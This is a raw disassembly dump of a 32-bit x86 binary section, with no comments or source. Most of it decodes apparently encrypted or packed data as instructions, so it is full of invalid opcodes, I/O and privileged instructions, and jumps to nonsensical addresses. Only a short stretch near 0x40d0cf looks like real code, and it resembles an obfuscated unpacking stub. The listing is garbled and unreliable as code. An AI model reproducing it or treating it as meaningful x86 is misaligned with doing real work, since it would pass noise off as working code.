  40ccf5:	sbb    DWORD PTR [ebx-0x51681ee1],0x417ab168
  40ccff:	fwait
  40cd00:	push   0x7fc0d02b
  40cd05:	push   ebx
  40cd06:	popf   
  40cd07:	addr16 xchg edi,eax
  40cd09:	repz cmp bh,BYTE PTR [eax-0x740dca65]
  40cd10:	xchg   ebp,eax
  40cd11:	test   al,0xaa
  40cd13:	dec    ebx
  40cd14:	jge    0x40cca6
  40cd16:	jle    0x40cd15
  40cd18:	es cmc 
  40cd1a:	shl    DWORD PTR [ebx],cl
  40cd1c:	mov    ecx,0x7466b5ee
  40cd21:	(bad)  
  40cd22:	in     eax,dx
  40cd23:	xor    DWORD PTR [esi],ebx
  40cd25:	dec    esp
  40cd26:	xor    DWORD PTR [ecx],ecx
  40cd28:	ins    DWORD PTR es:[edi],dx
  40cd29:	sahf   
  40cd2a:	inc    ebx
  40cd2b:	popa   
  40cd2c:	push   edx
  40cd2d:	lods   al,BYTE PTR ds:[esi]
  40cd2e:	scas   eax,DWORD PTR es:[edi]
  40cd2f:	leave  
  40cd30:	test   DWORD PTR [esi-0x28],edi
  40cd33:	mov    eax,0x6e8e1b40
  40cd38:	test   BYTE PTR [ebx+eax*1-0x398dec8],al
  40cd3f:	es jecxz 0x40cd34
  40cd42:	and    esp,esi
  40cd44:	push   cs
  40cd45:	rcr    DWORD PTR [esi],0x4d
  40cd48:	inc    eax
  40cd49:	add    eax,0xb2c341dc
  40cd4e:	dec    DWORD PTR [edi]
  40cd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd51:	xor    bl,BYTE PTR [ecx]
  40cd53:	adc    BYTE PTR [eax-0x7f],ah
  40cd56:	lds    edx,FWORD PTR [eax+ebx*4+0x22602fa8]
  40cd5d:	inc    ecx
  40cd5e:	inc    edx
  40cd5f:	loope  0x40cd06
  40cd61:	fcmovnu st,st(5)
  40cd63:	lds    edx,FWORD PTR [esi-0x7a47e0b8]
  40cd69:	das    
  40cd6a:	fimul  WORD PTR [ebx-0x33]
  40cd6d:	sub    eax,0x99cf698c
  40cd72:	fs push ebx
  40cd74:	iret   
  40cd75:	je     0x40cda7
  40cd77:	mov    edi,fs
  40cd79:	iret   
  40cd7a:	shl    DWORD PTR [edi],0x58
  40cd7d:	push   ecx
  40cd7e:	inc    eax
  40cd7f:	adc    ebx,DWORD PTR [ecx-0xc]
  40cd82:	xor    eax,0xefc665e5
  40cd87:	pop    ebp
  40cd88:	mov    edi,0xdd51014a
  40cd8d:	addr16 mov esp,0xb609fc27
  40cd93:	pop    edx
  40cd94:	shl    BYTE PTR [eax+0xb],0x27
  40cd98:	xor    DWORD PTR [ebx-0x3586efa9],ecx
  40cd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd9f:	addr16 jg 0x40cd38
  40cda2:	xchg   DWORD PTR [edx],ebx
  40cda4:	(bad)  
  40cda5:	xchg   ebx,eax
  40cda6:	or     ah,BYTE PTR ds:0xb94a55c0
  40cdac:	push   ecx
  40cdad:	lods   eax,DWORD PTR ds:[esi]
  40cdae:	iret   
  40cdaf:	jbe    0x40cdd1
  40cdb1:	call   FWORD PTR [edx]
  40cdb3:	call   FWORD PTR [ebx+eax*2+0x30064810]
  40cdba:	out    dx,eax
  40cdbb:	jmp    0x54650078
  40cdc0:	xor    DWORD PTR [eax+0x6e],eax
  40cdc3:	loop   0x40cd7a
  40cdc5:	ret    0xcde
  40cdc8:	pop    eax
  40cdc9:	dec    edi
  40cdca:	and    esp,DWORD PTR [ebp-0x6d]
  40cdcd:	les    edi,FWORD PTR [ecx-0x38fed8b1]
  40cdd3:	aaa    
  40cdd4:	outs   dx,BYTE PTR ds:[esi]
  40cdd5:	dec    esi
  40cdd6:	dec    ebp
  40cdd7:	push   ss
  40cdd8:	inc    esp
  40cdd9:	add    al,0x6c
  40cddb:	std    
  40cddc:	leave  
  40cddd:	fstp   DWORD PTR [ecx-0x7af4321a]
  40cde3:	and    BYTE PTR [esi+0x24],cl
  40cde6:	xchg   ebp,eax
  40cde7:	mov    ch,0x40
  40cde9:	in     al,0xca
  40cdeb:	fnstcw WORD PTR [eax+0x5f]
  40cdee:	sbb    BYTE PTR [edi+0x22],ch
  40cdf1:	mov    ah,0x76
  40cdf3:	pushf  
  40cdf4:	xchg   ebp,eax
  40cdf5:	in     eax,dx
  40cdf6:	xchg   BYTE PTR ds:0xe23509b3,bh
  40cdfc:	in     al,dx
  40cdfd:	push   0x1a
  40cdff:	push   0x2c
  40ce01:	icebp  
  40ce02:	mov    al,ds:0xa002d8c0
  40ce07:	cld    
  40ce08:	jmp    0x56b4:0x9148566b
  40ce0f:	push   ebp
  40ce10:	xchg   ebx,eax
  40ce11:	js     0x40cdc8
  40ce13:	(bad)  
  40ce14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce15:	mov    edx,DWORD PTR [ebp-0x2e1bae95]
  40ce1b:	das    
  40ce1c:	push   es
  40ce1d:	xor    edi,DWORD PTR [ecx]
  40ce1f:	mov    ecx,0xaf09627d
  40ce24:	dec    edi
  40ce25:	fldenv [ebx]
  40ce27:	adc    esp,DWORD PTR [edi]
  40ce29:	je     0x40ce78
  40ce2b:	les    ebp,FWORD PTR [esi+ecx*2-0x5ed0c856]
  40ce32:	in     eax,0x24
  40ce34:	je     0x40ceb5
  40ce36:	jbe    0x40cea0
  40ce38:	cmp    DWORD PTR [ebp-0x271a4649],ebx
  40ce3e:	mov    esp,0x9f18fff3
  40ce43:	inc    ebp
  40ce44:	mov    edx,0x766ab257
  40ce49:	or     BYTE PTR [eax-0x6b],dl
  40ce4c:	mov    ah,0x3f
  40ce4e:	fild   QWORD PTR [eax+0x6ebb874c]
  40ce54:	adc    DWORD PTR [eax+ecx*1+0x46],ebp
  40ce58:	xor    cl,bh
  40ce5a:	in     eax,0xd
  40ce5c:	fiadd  DWORD PTR [eax+0x77]
  40ce5f:	setno  BYTE PTR [ebx-0x7c]
  40ce63:	call   0xd366599d
  40ce68:	or     al,0x4f
  40ce6a:	in     eax,0xde
  40ce6c:	ja     0x40ce2b
  40ce6e:	mov    ch,0x80
  40ce70:	jno    0x40ceb8
  40ce72:	rcl    DWORD PTR [ebp+0x3],0xca
  40ce76:	test   al,0xa4
  40ce78:	dec    ebx
  40ce79:	inc    ecx
  40ce7a:	pop    edx
  40ce7b:	add    BYTE PTR [ecx+0xd06293],0x8f
  40ce82:	mov    ?,WORD PTR fs:[esp+eax*2+0x5f76a3a4]
  40ce8a:	xchg   ecx,eax
  40ce8b:	rcl    DWORD PTR [edx],cl
  40ce8d:	pushf  
  40ce8e:	xchg   esi,eax
  40ce8f:	iret   
  40ce90:	and    BYTE PTR [edi-0x5ca4086e],0x3
  40ce97:	mov    esi,0xb9b12c6a
  40ce9c:	call   0x55cad627
  40cea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cea2:	mov    eax,ds:0xc9e456f1
  40cea7:	xlat   BYTE PTR ds:[ebx]
  40cea8:	pop    eax
  40cea9:	imul   ecx,eax,0xb5b59ff
  40ceaf:	ficom  DWORD PTR [edi+esi*4+0x356d317f]
  40ceb6:	gs xchg esi,eax
  40ceb8:	push   ss
  40ceb9:	in     al,dx
  40ceba:	ins    BYTE PTR es:[edi],dx
  40cebb:	scas   eax,DWORD PTR es:[edi]
  40cebc:	add    ebp,DWORD PTR [edx+0x23ed64e9]
  40cec2:	cmp    al,0xa9
  40cec4:	pop    edx
  40cec5:	mov    ebx,0x3aaa6ba
  40ceca:	fs icebp 
  40cecc:	mov    al,ds:0x90a13d89
  40ced1:	cdq    
  40ced2:	inc    eax
  40ced3:	sub    eax,0x2b3a441e
  40ced8:	aaa    
  40ced9:	adc    al,0x8f
  40cedb:	mov    edi,0xdddd9e17
  40cee0:	mov    eax,ds:0xa74c4d07
  40cee5:	daa    
  40cee6:	jg     0x40cea3
  40cee8:	sbb    DWORD PTR [esi+0x5bd11ae4],edx
  40ceee:	xchg   DWORD PTR [eax],esp
  40cef0:	sar    dl,0x89
  40cef3:	push   ebx
  40cef4:	push   edx
  40cef5:	ret    
  40cef6:	mov    esi,0xe98d1e2c
  40cefb:	mov    bh,0x8b
  40cefd:	add    eax,DWORD PTR ds:0xb3b7adb9
  40cf03:	fcomp  QWORD PTR [ebx]
  40cf05:	lock test DWORD PTR [edx-0x346b7461],eax
  40cf0c:	jle    0x40cf21
  40cf0e:	xor    al,0x36
  40cf10:	fwait
  40cf11:	mov    ds:0x8ab7e91a,al
  40cf16:	cdq    
  40cf17:	add    esi,DWORD PTR fs:[esi+0x5c75a89e]
  40cf1e:	inc    esi
  40cf1f:	add    ch,bh
  40cf21:	in     eax,0x58
  40cf23:	popf   
  40cf24:	jae    0x40cee8
  40cf26:	in     eax,0x8a
  40cf28:	fdiv   st,st(7)
  40cf2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf2b:	mov    ah,0xa1
  40cf2d:	xchg   edi,eax
  40cf2e:	mov    al,fs:0x596728db
  40cf34:	aad    0x3c
  40cf36:	push   eax
  40cf37:	or     al,0x69
  40cf39:	call   DWORD PTR [eax]
  40cf3b:	imul   edi,DWORD PTR [ebp-0x9733932],0x5f
  40cf42:	pop    ebp
  40cf43:	test   eax,0x710e38a4
  40cf48:	jne    0x40cf4b
  40cf4a:	out    dx,eax
  40cf4b:	rcl    BYTE PTR [ebp+0x56b55784],1
  40cf51:	sub    al,0x36
  40cf53:	xchg   DWORD PTR [eax],edx
  40cf55:	stc    
  40cf56:	xchg   ebx,eax
  40cf57:	mov    bh,BYTE PTR [ebp+0x62cc2c53]
  40cf5d:	sbb    DWORD PTR [ebp+0x63275845],ebp
  40cf63:	jl     0x40ceed
  40cf65:	xor    dh,BYTE PTR [ebx]
  40cf67:	fs lock sahf 
  40cf6a:	mov    edx,0x6a3e6465
  40cf6f:	sbb    esp,DWORD PTR [ebx-0x1b4e0ced]
  40cf75:	cmp    esi,DWORD PTR [edi-0x17]
  40cf78:	scas   al,BYTE PTR es:[edi]
  40cf79:	jecxz  0x40cf8f
  40cf7b:	and    BYTE PTR [eax],bl
  40cf7d:	jae    0x40cfcf
  40cf7f:	adc    eax,0x78037a53
  40cf84:	addr16 (bad) 
  40cf86:	cli    
  40cf87:	(bad)  
  40cf88:	xor    eax,0x27fd0176
  40cf8d:	cwde   
  40cf8e:	iret   
  40cf8f:	mov    ebx,0x399518f9
  40cf94:	jbe    0x40d00b
  40cf96:	lock (bad) 
  40cf98:	stos   DWORD PTR es:[edi],eax
  40cf99:	xor    ah,BYTE PTR [ecx-0x7]
  40cf9c:	dec    ebp
  40cf9d:	rcr    DWORD PTR ds:0x96942f4e,0xd1
  40cfa4:	inc    ebp
  40cfa5:	outs   dx,DWORD PTR ds:[esi]
  40cfa6:	nop
  40cfa7:	sub    ah,BYTE PTR [ebp+ecx*4+0x78dd919b]
  40cfae:	out    0x41,al
  40cfb0:	fdivp  st(0),st
  40cfb2:	ror    BYTE PTR [ebx],cl
  40cfb4:	sbb    cl,BYTE PTR [ebx+0x54]
  40cfb7:	or     BYTE PTR [ecx+0x5c6b2be1],0xde
  40cfbe:	mov    ch,0x5b
  40cfc0:	shr    DWORD PTR [edi+0x587ab5df],cl
  40cfc6:	jmp    0x40cf6c
  40cfc8:	mov    cl,0x7a
  40cfca:	sbb    al,0xc7
  40cfcc:	add    DWORD PTR [ecx+0x4e880086],0x34
  40cfd3:	sub    al,0xb9
  40cfd5:	push   0x1
  40cfd7:	pop    ds
  40cfd8:	cwde   
  40cfd9:	scas   eax,DWORD PTR es:[edi]
  40cfda:	mov    bh,0x26
  40cfdc:	inc    edx
  40cfdd:	sub    al,0xc6
  40cfdf:	inc    edi
  40cfe0:	inc    eax
  40cfe1:	cmc    
  40cfe2:	adc    DWORD PTR [ecx],esp
  40cfe4:	adc    al,0xa0
  40cfe6:	not    eax
  40cfe8:	lods   eax,DWORD PTR ds:[esi]
  40cfe9:	add    ecx,DWORD PTR [eax]
  40cfeb:	pop    ecx
  40cfec:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfee:	dec    esp
  40cfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff0:	sub    eax,0x4c24ac72
  40cff5:	dec    esp
  40cff6:	out    dx,eax
  40cff7:	dec    eax
  40cff8:	inc    BYTE PTR [ebp+eax*8-0x18]
  40cffc:	imul   esp,DWORD PTR gs:[ebp-0x5c73c44],0x3abca0d7
  40d007:	mov    WORD PTR [esi-0x4542e6fd],ds
  40d00d:	mov    edx,0xf664f7e9
  40d012:	mov    ebp,ss
  40d014:	inc    esp
  40d015:	mov    cl,0x49
  40d017:	jmp    0x40d084
  40d019:	loope  0x40d034
  40d01b:	ret    
  40d01c:	fisub  WORD PTR [ecx+0x451966c0]
  40d022:	push   ebp
  40d023:	lea    eax,[ecx+0x3165340a]
  40d029:	xchg   ebp,eax
  40d02a:	ins    DWORD PTR es:[edi],dx
  40d02b:	add    eax,DWORD PTR [ebx]
  40d02d:	push   ebx
  40d02e:	and    ch,BYTE PTR [edi]
  40d030:	gs stc 
  40d032:	jl     0x40cfd6
  40d034:	xchg   DWORD PTR [ebx],edx
  40d036:	push   ss
  40d037:	jmp    FWORD PTR [ebp+0x4b31a51e]
  40d03d:	out    0xd7,eax
  40d03f:	aaa    
  40d040:	xchg   esi,eax
  40d041:	pop    esp
  40d042:	outs   dx,DWORD PTR ss:[esi]
  40d044:	fdivr  QWORD PTR [ecx+ecx*2+0x4366600d]
  40d04b:	sbb    al,0xda
  40d04d:	sub    dh,bh
  40d04f:	ror    DWORD PTR [edi+eiz*4+0x3b3252b7],0xc6
  40d057:	xchg   esi,eax
  40d058:	or     BYTE PTR [ecx-0xc],bl
  40d05b:	or     bh,BYTE PTR [edi-0x6ea44c8b]
  40d061:	loope  0x40d022
  40d063:	fimul  WORD PTR [ecx-0x3fecca8d]
  40d069:	sub    edi,DWORD PTR [esi]
  40d06b:	cwde   
  40d06c:	ret    0xaa27
  40d06f:	inc    edi
  40d070:	add    DWORD PTR [ebx],esi
  40d072:	rol    dh,0xb4
  40d075:	call   0xcbc7:0xaac6b39f
  40d07c:	pop    eax
  40d07d:	mov    al,0xef
  40d07f:	add    al,0x39
  40d081:	ins    BYTE PTR es:[edi],dx
  40d082:	add    bl,BYTE PTR [ecx+0x54e1349b]
  40d088:	mov    al,0xd0
  40d08a:	mov    ebx,0x79ff6b48
  40d08f:	das    
  40d090:	cmp    dh,0xee
  40d093:	lods   al,BYTE PTR ds:[esi]
  40d094:	or     al,0x40
  40d096:	out    0x30,eax
  40d098:	jns    0x40d0a2
  40d09a:	(bad)  
  40d09c:	mov    dh,0x3f
  40d09e:	push   esi
  40d09f:	jo     0x40d0f7
  40d0a1:	(bad)  
  40d0a2:	xor    eax,0xd6e6d3df
  40d0a7:	push   0xffffffa9
  40d0a9:	popa   
  40d0aa:	(bad)  
  40d0ab:	mov    esp,0x79a37e8f
  40d0b0:	stc    
  40d0b1:	test   al,0x19
  40d0b3:	jle    0x40d0da
  40d0b5:	push   ecx
  40d0b6:	jae    0x40d087
  40d0b8:	ins    BYTE PTR es:[edi],dx
  40d0b9:	mov    bh,BYTE PTR [esp+ecx*1+0x32]
  40d0bd:	inc    edi
  40d0be:	in     eax,dx
  40d0bf:	cs cdq 
  40d0c1:	jmp    0xd4e7:0x17b5ca1f
  40d0c8:	call   0xfb7b:0x558e8f24
  40d0cf:	mov    DWORD PTR [ebp-0x20],eax
  40d0d2:	adc    edx,0x5a
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	push   ds
  40d1ab:	imul   BYTE PTR [ecx+edx*8]
  40d1ae:	xchg   ecx,eax
  40d1af:	out    0xbe,eax
  40d1b1:	mov    esi,0xbebec492
  40d1b6:	xchg   ebp,eax
  40d1b7:	cwde   
  40d1b8:	outs   dx,BYTE PTR ds:[esi]
  40d1b9:	fild   DWORD PTR [ecx-0x67e4ecf9]
  40d1bf:	pop    ss
  40d1c0:	aas    
  40d1c1:	scas   al,BYTE PTR es:[edi]
  40d1c2:	dec    esi
  40d1c3:	imul   ebp,edi,0x32
  40d1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1c8:	dec    ecx
  40d1c9:	adc    al,ch
  40d1cb:	xchg   edi,eax
  40d1cc:	es jbe 0x40d226
  40d1cf:	mov    ds:0xd5964ab7,al
  40d1d4:	adc    eax,DWORD PTR [eax]
  40d1d6:	push   cs
  40d1d7:	cdq    
  40d1d8:	out    dx,eax
  40d1d9:	jnp    0x40d15b
  40d1db:	clc    
  40d1dc:	test   dh,bl
  40d1de:	cmp    eax,0x24706697
  40d1e3:	bnd jp 0x40d184
  40d1e6:	mov    BYTE PTR [edi],bh
  40d1e8:	scas   eax,DWORD PTR es:[edi]
  40d1e9:	pop    edi
  40d1ea:	mov    ebx,0xd72ddf69
  40d1ef:	xchg   esp,eax
  40d1f0:	mov    esi,0x7fc229e9
  40d1f5:	rol    BYTE PTR [edx-0x3e],cl
  40d1f8:	aad    0xd7
  40d1fa:	ja     0x40d231
  40d1fc:	shl    esi,1
  40d1fe:	xchg   esp,eax
  40d1ff:	push   ebp
  40d200:	jle    0x40d194
  40d202:	jo     0x40d20e
  40d204:	lahf   
  40d205:	or     eax,0x3862940c
  40d20a:	xor    DWORD PTR [ecx],ebp
  40d20c:	repz enter 0x383b,0x74
  40d211:	rol    DWORD PTR [ecx],cl
  40d213:	repnz stos DWORD PTR es:[edi],eax
  40d215:	push   edi
  40d216:	mov    al,ds:0xe0e405f2
  40d21b:	add    bl,ah
  40d21d:	push   0xe7ac10e3
  40d222:	mov    eax,0xf60578e1
  40d227:	pop    esi
  40d228:	fmul   st(1),st
  40d22a:	ds stos DWORD PTR es:[edi],eax
  40d22c:	or     ecx,DWORD PTR [ecx+esi*2]
  40d22f:	aad    0xc9
  40d231:	mov    eax,0xa44afae2
  40d236:	cmp    eax,0x10543bac
  40d23b:	push   cs
  40d23c:	mov    esi,0xde3066fb
  40d241:	inc    esp
  40d242:	outs   dx,DWORD PTR ds:[esi]
  40d243:	xchg   ecx,eax
  40d244:	rcl    DWORD PTR es:[ebx+0xc399412],cl
  40d24b:	fs in  eax,dx
  40d24d:	daa    
  40d24e:	fst    st(1)
  40d250:	push   0x20
  40d252:	loopne 0x40d29c
  40d254:	sbb    edi,edi
  40d256:	pop    ds
  40d257:	out    dx,al
  40d258:	jmp    0x40d215
  40d25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d25b:	push   0x6c
  40d25d:	add    BYTE PTR [ecx-0x67dbb4e7],cl
  40d263:	and    eax,0xe641287f
  40d268:	loop   0x40d2de
  40d26a:	lods   al,BYTE PTR ds:[esi]
  40d26b:	jmp    0x40d209
  40d26d:	jmp    0x2837eeac
  40d272:	sub    al,0x39
  40d274:	pop    edi
  40d275:	dec    edx
  40d276:	adc    dl,BYTE PTR [ebx-0xfa154c1]
  40d27c:	shl    DWORD PTR [esi],cl
  40d27e:	mov    ebp,0x24359a1c
  40d283:	mov    ch,0x11
  40d285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d286:	fs (bad) 
  40d288:	push   ecx
  40d289:	or     dh,BYTE PTR [esi-0x62]
  40d28c:	or     dl,BYTE PTR [eax-0x1c0eda1a]
  40d292:	xlat   BYTE PTR ds:[ebx]
  40d293:	adc    DWORD PTR [ebp+ebp*4-0x39],ebx
  40d297:	dec    ecx
  40d298:	into   
  40d299:	in     eax,dx
  40d29a:	fdiv   QWORD PTR [edx-0x30]
  40d29d:	cs mov esp,0x9a0e9951
  40d2a3:	sub    BYTE PTR [edx],dl
  40d2a5:	cmp    bl,0x87
  40d2a8:	mov    al,0xf5
  40d2aa:	sub    dl,BYTE PTR [ebp+0x14]
  40d2ad:	xchg   esp,eax
  40d2ae:	cld    
  40d2af:	push   0xffffff8a
  40d2b1:	repnz pop es
  40d2b3:	fistp  DWORD PTR [esi+0x3a4eb6ca]
  40d2b9:	fsubr  st(4),st
  40d2bb:	push   ecx
  40d2bc:	cmp    eax,0x74b01b13
  40d2c1:	mov    bl,0x23
  40d2c3:	repz repnz mov al,0x36
  40d2c7:	sbb    BYTE PTR [ebx+0xf4125e2],0x1c
  40d2ce:	stc    
  40d2cf:	jp     0x40d341
  40d2d1:	push   0xda01b3c8
  40d2d6:	push   0x6c
  40d2d8:	sbb    BYTE PTR [eax-0x6],bh
  40d2db:	sub    bh,BYTE PTR [edx+0x53]
  40d2de:	leave  
  40d2df:	push   eax
  40d2e0:	in     al,0x0
  40d2e2:	pop    edi
  40d2e3:	mov    al,BYTE PTR [edx-0x34454d62]
  40d2e9:	fstp   DWORD PTR [ebx]
  40d2eb:	sub    bh,BYTE PTR [edi]
  40d2ed:	and    DWORD PTR [ecx],esi
  40d2ef:	jae    0x40d32a
  40d2f1:	js     0x40d2c7
  40d2f3:	jns    0x40d2a5
  40d2f5:	jl     0x40d2ff
  40d2f7:	sti    
  40d2f8:	push   ds
  40d2f9:	jbe    0x40d2df
  40d2fb:	sti    
  40d2fc:	jecxz  0x40d365
  40d2fe:	test   ebp,edi
  40d300:	in     al,dx
  40d301:	and    eax,0x6544ec45
  40d306:	ja     0x40d293
  40d308:	scas   al,BYTE PTR es:[edi]
  40d309:	sub    esi,DWORD PTR ds:0x9a0b0b45
  40d30f:	mov    gs,WORD PTR [ebp+0x37624fe4]
  40d315:	in     al,dx
  40d316:	add    cl,BYTE PTR [esi]
  40d318:	test   al,0xcc
  40d31a:	inc    edx
  40d31b:	mov    edx,0xd21f05e8
  40d320:	push   0x56bb8c5
  40d325:	mul    ebp
  40d327:	xlat   BYTE PTR ds:[ebx]
  40d328:	mov    edi,0x39fdc2c1
  40d32d:	jnp    0x40d2eb
  40d32f:	jmp    0x40d311
  40d331:	(bad)  
  40d333:	fstp   TBYTE PTR [ebx+eiz*8+0x768a836f]
  40d33a:	dec    ecx
  40d33b:	pop    ds
  40d33c:	sbb    ebx,DWORD PTR [ecx+0x56e0fb66]
  40d342:	mov    ds:0x2648d3cc,eax
  40d347:	call   0x306adfca
  40d34c:	push   esi
  40d34d:	pusha  
  40d34e:	lods   eax,DWORD PTR ds:[esi]
  40d34f:	outs   dx,BYTE PTR ds:[esi]
  40d350:	cmc    
  40d351:	push   edx
  40d352:	loope  0x40d2f3
  40d354:	mov    al,0xca
  40d356:	ficom  WORD PTR [esi]
  40d358:	je     0x40d3ae
  40d35a:	add    eax,0x40cf70ea
  40d35f:	js     0x40d3ba
  40d361:	sbb    eax,0x516b7ff5
  40d366:	lods   al,BYTE PTR ds:[esi]
  40d367:	ss lock ins BYTE PTR es:[edi],dx
  40d36a:	and    BYTE PTR [ebx-0x4f],ah
  40d36d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36e:	mov    cl,0xa2
  40d370:	fisubr DWORD PTR [ebx+0x46337def]
  40d376:	inc    esi
  40d377:	pcmpgtb mm0,QWORD PTR [edx-0x35]
  40d37b:	stos   BYTE PTR es:[edi],al
  40d37c:	or     al,0x54
  40d37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d37f:	push   ebp
  40d380:	push   ebp
  40d381:	mov    eax,0x3805d29c
  40d386:	js     0x40d318
  40d388:	cmp    esi,DWORD PTR [esi+0x2a]
  40d38b:	shl    DWORD PTR [ecx-0x54],cl
  40d38e:	aad    0xf4
  40d390:	std    
  40d391:	cmp    eax,0x3c1d6e1b
  40d396:	scas   al,BYTE PTR es:[edi]
  40d397:	js     0x40d3a4
  40d399:	dec    eax
  40d39a:	ins    DWORD PTR es:[edi],dx
  40d39b:	lock mov eax,eax
  40d39e:	push   ecx
  40d39f:	sub    DWORD PTR [esi-0x71a90e42],0x7bf2d994
  40d3a9:	xchg   ebp,eax
  40d3aa:	in     eax,0x4b
  40d3ac:	shl    DWORD PTR [edi-0x2c],0x99
  40d3b0:	lds    ecx,FWORD PTR [edx]
  40d3b2:	mov    ecx,0xe16c35c7
  40d3b7:	pop    es
  40d3b8:	scas   eax,DWORD PTR es:[edi]
  40d3b9:	dec    eax
  40d3ba:	sbb    al,0xf9
  40d3bc:	push   ebx
  40d3bd:	lar    esi,WORD PTR [esi+0x7a7bcd46]
  40d3c4:	mov    dl,0x2d
  40d3c6:	mov    ch,0x8c
  40d3c8:	mov    ds:0xa077f15b,eax
  40d3cd:	sub    al,0x79
  40d3cf:	adc    bl,dl
  40d3d1:	imul   edi,ebp,0x77d61156
  40d3d7:	push   ebx
  40d3d8:	jbe    0x40d3eb
  40d3da:	scas   al,BYTE PTR es:[edi]
  40d3db:	adc    DWORD PTR [ebp-0x585fc72e],ecx
  40d3e1:	stos   BYTE PTR es:[edi],al
  40d3e2:	xchg   edx,eax
  40d3e3:	adc    DWORD PTR [eax],ebx
  40d3e5:	daa    
  40d3e6:	gs dec esi
  40d3e8:	test   DWORD PTR [edi-0x3c],0xb2c44efb
  40d3ef:	test   ebx,eax
  40d3f1:	lea    esi,[edx]
  40d3f3:	or     bh,cl
  40d3f5:	lea    esp,[ecx]
  40d3f7:	inc    ebp
  40d3f8:	mov    BYTE PTR [esi-0x28],dh
  40d3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3fc:	sub    esi,DWORD PTR [ebp-0x7a]
  40d3ff:	mov    cl,0xac
  40d401:	shl    BYTE PTR [ecx-0x429208e4],0x99
  40d408:	shl    DWORD PTR [edi+0x0],cl
  40d40b:	sub    eax,ecx
  40d40d:	inc    esp
  40d40e:	lods   al,BYTE PTR ds:[esi]
  40d40f:	xchg   esp,eax
  40d410:	xlat   BYTE PTR ds:[ebx]
  40d411:	push   0xcdca5ec5
  40d416:	data16 loopne 0x40d3d4
  40d419:	and    al,ah
  40d41b:	inc    ebx
  40d41c:	xor    eax,esp
  40d41e:	or     al,0xe5
  40d420:	xor    DWORD PTR [ecx+edx*2-0x2736bc5],ecx
  40d427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d428:	push   ss
  40d429:	pop    edx
  40d42a:	mov    bl,0xda
  40d42c:	mov    bh,0x64
  40d42e:	scas   eax,DWORD PTR es:[edi]
  40d42f:	cmp    eax,0xc1f5c6f0
  40d434:	cmp    BYTE PTR [edi],cl
  40d436:	shl    DWORD PTR [esi-0x273b0b45],cl
  40d43c:	or     ebp,edx
  40d43e:	sbb    al,0x71
  40d440:	dec    esp
  40d441:	jbe    0x40d3ff
  40d443:	sbb    BYTE PTR [edi],0xbd
  40d446:	push   DWORD PTR [ecx]
  40d448:	jne    0x40d3d6
  40d44a:	sub    DWORD PTR ds:0x6f552ab,edi
  40d450:	repz push 0x36
  40d453:	(bad)  
  40d455:	cdq    
  40d456:	mov    DWORD PTR [esi+0x62],edi
  40d459:	aad    0x86
  40d45b:	ss push esi
  40d45d:	jecxz  0x40d401
  40d45f:	pop    eax
  40d460:	es mov esi,0x8eb888c7
  40d466:	mov    edx,0x8c08974e
  40d46b:	hlt    
  40d46c:	iret   
  40d46d:	nop
  40d46e:	stc    
  40d46f:	outs   dx,DWORD PTR ds:[esi]
  40d470:	sbb    edx,DWORD PTR [esi+ebp*4]
  40d473:	cmp    BYTE PTR [ebx+0x61],cl
  40d476:	add    eax,0x71c6f000
  40d47b:	push   0x58cfd89a
  40d480:	jbe    0x40d45b
  40d482:	bound  esi,QWORD PTR [eax]
  40d484:	dec    edx
  40d485:	mov    ah,0xce
  40d487:	cmp    eax,0xfd555307
  40d48c:	ds push ecx
  40d48e:	dec    esp
